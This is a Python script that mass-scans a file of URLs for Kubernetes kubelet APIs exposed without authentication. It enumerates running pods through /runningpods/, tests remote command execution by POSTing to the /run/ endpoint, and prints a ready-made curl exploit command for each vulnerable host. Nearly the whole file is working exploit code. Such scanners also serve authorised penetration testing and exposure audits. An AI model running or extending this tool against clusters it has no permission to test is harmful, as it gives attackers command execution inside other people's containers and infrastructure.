# Author: joelczk
# Description: Mass scan for unauthenticated kubernetes on port 10250


import requests
import argparse
import random
import string
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))
   
def get_running_pods(url):
    url = url + "/runningpods/"
    runningpods = []
    try:
        r = requests.get(url, verify=False)
        res = r.json()
        for item in res['items']:
            data = {}
            podname = item['metadata']['name']
            namespace = item['metadata']['namespace']
            container = item['spec']['containers'][0]['name']
            data['podname'] = podname
            data['namespace'] = namespace
            data['container'] = container
            runningpods.append(data)
    except Exception as e:
        print("{url}: An error occurred".format(url=url))
        print("[!] {e}".format(e=e))
        return False
    return runningpods

def check_rce(url, runningpods):
    for item in runningpods:
        random_string = randomword(10)
        command = 'echo "{random_string}"'.format(random_string=random_string)
        namespace = item['namespace']
        podname  = item['podname']
        container = item['container']   
        exploiturl = url + "/run/{namespace}/{podname}/{container}".format(namespace=namespace,podname=podname,container=container)
        data = {'cmd':command}
        r = requests.post(url=exploiturl, verify=False, data=data)
        output = r.text.strip()
        if "exited" in output:
            continue
        else:
            print("{url} is vulnerable!".format(url=url))
            exploit_command = 'curl -k -XPOST "{url}" -d "cmd=whoami"'.format(url=exploiturl)
            print("[+] {exploit_command}".format(exploit_command=exploit_command))
            return
    print("{url} is not vulnerable!".format(url=url))  

def main(kube_file):
    urls = open(kube_file).readlines()
    for url in urls:
        url = url.strip()
        runningpods = get_running_pods(url)
        if runningpods == False:
            continue
        else:
            check_rce(url, runningpods)  
                     
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', '--file', help='File containing the list of Kubertnetes urls')
    args = parser.parse_args()
    main(args.file)
